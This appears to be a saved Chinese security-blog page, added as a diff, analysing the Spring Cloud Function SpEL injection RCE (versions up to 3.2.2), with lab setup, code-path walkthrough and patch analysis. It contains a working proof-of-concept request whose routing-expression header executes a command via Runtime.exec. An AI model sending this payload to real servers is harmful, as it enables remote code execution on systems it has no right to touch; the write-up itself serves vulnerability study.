@@ -1,0 +1,290 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>Spring Cloud Function Spel表达式注入 | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    Spring Cloud Function Spel表达式注入
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-04-05 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/_1xjK2YDa/" class="post-tags">
+                            # Java安全
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="spring-cloud-function-spel表达式注入">Spring Cloud Function Spel表达式注入</h1>
+<h2 id="漏洞概述"><strong>漏洞概述</strong></h2>
+<p>Spring Cloud Function 是基于Spring Boot 的函数计算框架（FaaS），支持基于SpEL的函数式动态路由。在特定配置下，3 &lt;= 版本 &lt;= 3.2.2（ commit dc5128b 之前）存在SpEL表达式执行导致的RCE。</p>
+<h2 id="环境搭建"><strong>环境搭建</strong></h2>
+<p>在IDEA中选择新建项目，然后选择<code>Spring Initializr</code>，输入随机项目名称，然后选择java版本和jdk版本后点击下一步。</p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/7922e470c335173d8ad14cb74a437406.png" alt="image-20220403220315187" loading="lazy"></figure>
+<p>选择Spring Web Spring Cloud function</p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/b50c8583f60481ff750127dab7682d71.png" alt="image-20220403222049811" loading="lazy"></figure>
+<p>最新版本3.2.2也是存在漏洞的，若在官方出新版本后想要复现此漏洞，那么需要修改pom中<code>spring-cloud-function-web</code>的版本为3.2.2，如下图所示：</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/ef75eef59b4aa593235b14aaca073506.png" alt="image-20220403222337581" loading="lazy"></figure>
+<p>确认项目中的<code>spring-cloud-function-web</code>是存在漏洞版本后，就可以直接启动项目了，无需进行任何修改。</p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>弹计算器payload</p>
+<pre><code>POST /functionRouter HTTP/1.1
+Host:127.0.0.1:8080
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)
+Content-Type:application/x-www-form-urlencoded
+Content-Length: 3
+
+xxx
+</code></pre>
+<p>看一眼POC就知道其实就是简单的在请求的headers头上添加一个spring.cloud.function.routing-expression参数</p>
+<p>SpringCloud Function会直接将其参数内容直接带入到SPEL中查询，造成SPEL漏洞注入。</p>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/5761fd84e05aa25797e3ca243bfb81fe.png" alt="image-20220403231631626" loading="lazy"></figure>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>漏洞是出在SpringCloud Function的RoutingFunction功能上，其功能的目的本身就是为了微服务应运而生的，可以直接通过HTTP请求与单个的函数进行交互，同时为spring.cloud.function.definition参数提供您要调用的函数的名称。</p>
+<p>为了更好的分析，可以先在springcloudfunctionspel\src\main\java\com\example\springcloudfunctionspel\SpringcloudfunctionspelApplication.java中写测试Demo</p>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/1deadf63379e69adc75a3c1cc8453b3f.png" alt="image-20220403232848334" loading="lazy"></figure>
+<p>然后再进行访问，请求中写出存在的函数就能够调用</p>
+<pre><code>POST /functionRouter HTTP/1.1
+Host: localhost:8080
+spring.cloud.function.definition: uppercase
+Content-Type: text/plain
+Content-Length: 3
+
+abc
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/b75263cf8b3d9abc5c2aaf3168dcc3cd.png" alt="image-20220403233039490" loading="lazy"></figure>
+<p>成功得到abc的大写结果ABC</p>
+<p>漏洞存在于header头的spring.cloud.function.routing-expression参数</p>
+<p>，和definition相同，他也是官方提供的功能。</p>
+<p>在org.springframework.cloud.function.web.util.FunctionWebRequestProcessingHelper#processRequest方法下断点</p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/img_convert/ccacf2c2237cb4c7935044bc4d9b6cca.png" alt="image-20220405001126121" loading="lazy"></figure>
+<p>程序会判断当前请求是否为RoutingFunction</p>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/img_convert/b3ca0097e43fde9f71afcef23124b2c0.png" alt="image-20220405001144798" loading="lazy"></figure>
+<p>并将我们提交的请求头和请求体内容编译成Message并且传入FunctionInvocationWrapper的apply方法中</p>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/img_convert/27a1082925c984cc56440d8388a7c959.png" alt="image-20220405001504170" loading="lazy"></figure>
+<p>跟进RoutingFunction的apply方法</p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/img_convert/633900a7c3fde622f48eee490b9644ad.png" alt="image-20220405001656778" loading="lazy"></figure>
+<p>最后进入到org.springframework.cloud.function.context.config.RoutingFunction#route方法中</p>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/img_convert/8245fce7961226d51e3831675830348f.png" alt="image-20220405001743831" loading="lazy"></figure>
+<p>然后在这里判断了请求headers头中有没有spring.cloud.function.routing-expression参数（这里可以清晰的看到spring.cloud.function.definition也是在这里做判断的）</p>
+<p>并将结果带入到this.functionFromExpression()方法中</p>
+<figure data-type="image" tabindex="12"><img src="https://img-blog.csdnimg.cn/img_convert/28c6a9fd93c34062a08c8b794fbb48e0.png" alt="image-20220405002455553" loading="lazy"></figure>
+<p>在这里最后SpelExpressionParser解析了Spel表达式，调用了expression.getValue导致Spel表达式注入</p>
+<figure data-type="image" tabindex="13"><img src="https://img-blog.csdnimg.cn/img_convert/418d3c835ac193094df6f9ecec901ec3.png" alt="image-20220405003124333" loading="lazy"></figure>
+<p>而他的EvaluationContext又采取了默认的StandardEvaluationContext，在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)或者直接new来调用任意对象的任意方法，成功造成任意命令执行。</p>
+<figure data-type="image" tabindex="14"><img src="https://img-blog.csdnimg.cn/img_convert/8d25fed78e59e94e587f619e4dc1ce4a.png" alt="image-20220405004040946" loading="lazy"></figure>
+<h2 id="补丁分析">补丁分析</h2>
+<ul>
+<li>https://github.com/spring-cloud/spring-cloud-function/commit/dc5128b80c6c04232a081458f637c81a64fa9b52</li>
+</ul>
+<p>由于又是Spel注入问题，很容易定位到Context</p>
+<figure data-type="image" tabindex="15"><img src="https://img-blog.csdnimg.cn/img_convert/27c534f16c73bb37ccadad7585eee937.png" alt="image-20220330141227267" loading="lazy"></figure>
+<p>新增了headerEvalContext常量为SimpleEvaluationContext，显然是为了替换evalContext常量的StandardEvaluationContext而创建的</p>
+<figure data-type="image" tabindex="16"><img src="https://img-blog.csdnimg.cn/img_convert/f61fd2d9c832c7d20edda3f6e231c97a.png" alt="image-20220403231314162" loading="lazy"></figure>
+<p>增加了判断来源是否是header，如果是header就使用属于SimpleEvaluationContext的headerEvalContext，不是header才会使用属于StandardEvaluationContext的evalContext。</p>
+<p>从而解决了发送恶意请求就能够RCE的问题。</p>
+<h2 id="后记">后记</h2>
+<p>整个流程也是很清晰，就是官方提供的类似spring.cloud.function.definition的功能，spring.cloud.function.routing-expression有解析Spel表达式的能力，而且使用的是默认的StandardEvaluationContext。最终Spel表达式注入造成了命令执行。</p>
+<p>和<strong>Spring Cloud Gateway rce</strong>其实是相似的，都是官方提供的功能有Spel表达式解析能力，但都没有对指定EvaluationContext，采用默认的StandardEvaluationContext从而导致了命令执行。</p>
+<p>不过这个影响范围在国内是更小的，后续的回显链挖掘也没有进行（也是因为影响范围吧）</p>
+<h2 id="参考">参考</h2>
+<ul>
+<li>https://www.cnblogs.com/wh4am1/p/16062306.html</li>
+</ul>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/spring-framework-rcecve-2022-22965/" class="post-title gt-a-link">
+                    Spring Framework RCE(CVE-2022-22965)
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/spring-cloud-function-spel-biao-da-shi-zhu-ru/" class="leancloud_visitors" data-flag-title="Spring Cloud Function Spel表达式注入">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
